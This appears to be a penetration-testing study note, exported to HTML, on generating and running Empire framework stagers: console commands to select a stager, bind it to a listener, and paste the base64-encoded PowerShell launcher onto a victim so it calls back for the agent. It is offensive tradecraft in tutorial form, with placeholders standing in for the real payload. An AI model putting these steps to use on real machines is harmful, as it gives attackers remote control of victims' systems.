<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Stagers</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Stagers</h1><br/>A <span style="text-decoration:underline;">stager</span> is the part of the payload that establish a communication channel between the attacker and the victim<br />    <a href=""><img src="images/1095-1.png" alt="images/1095-1.png" /></a><br /><br /><strong>Stagers on Empire</strong><br />1. Create a Stager <br />    <div class="codebox"><div class="codebox">(Empire)&gt;&nbsp;usestager&nbsp;#SPACE&nbsp;and&nbsp;double&nbsp;TAB</div></div><br />    <a href=""><img src="images/1095-2.png" alt="images/1095-2.png" /></a><br />    <div class="codebox"><div class="codebox">(Empire)&gt;&nbsp;usestager&nbsp;[stager]<br />(Empire)&gt;&nbsp;info</div></div><br />    <div class="codebox"><div class="codebox">(Empire)&gt;&nbsp;set&nbsp;Listener&nbsp;[listener]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#name&nbsp;that&nbsp;we&nbsp;have&nbsp;give&nbsp;to&nbsp;a&nbsp;listener&nbsp;that&nbsp;we&nbsp;have&nbsp;created<br />(Empire)&gt;&nbsp;execute<br />root@kali:/#&nbsp;cat&nbsp;/tmp/launcher.bat<br />root@kali:/#&nbsp;echo&nbsp;[base64_encoded_text]&nbsp;|&nbsp;base64&nbsp;--decode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#if&nbsp;we&nbsp;want&nbsp;to&nbsp;know&nbsp;which&nbsp;is&nbsp;the&nbsp;code&nbsp;encoded</div></div><br />    <a href=""><img src="images/1095-3.png" alt="images/1095-3.png" /></a><br />    <br />2. Execute the Stager on the Target<br />   ◇ We can upload(how we have seen in this chapter) the <strong>stager</strong> on the victim, it is a base64-encoded PowerShell command string. This part of the payload will connect to the listener running on the attacker and fetch the rest of the Empire agent code.<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;cd&nbsp;/tmp</div></div><br />   ◇ Copy and paste the code on the target machine<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;cat&nbsp;/tmp/launcher.bat<br /></div></div><br />    <a href=""><img src="images/1095-4.png" alt="images/1095-4.png" /></a><br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;echo&nbsp;[base64_encoded_text]&nbsp;|&nbsp;base64&nbsp;--decode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#if&nbsp;we&nbsp;want&nbsp;to&nbsp;know&nbsp;which&nbsp;is&nbsp;the&nbsp;code&nbsp;encoded</div></div><br /></div>
</body>
</html>
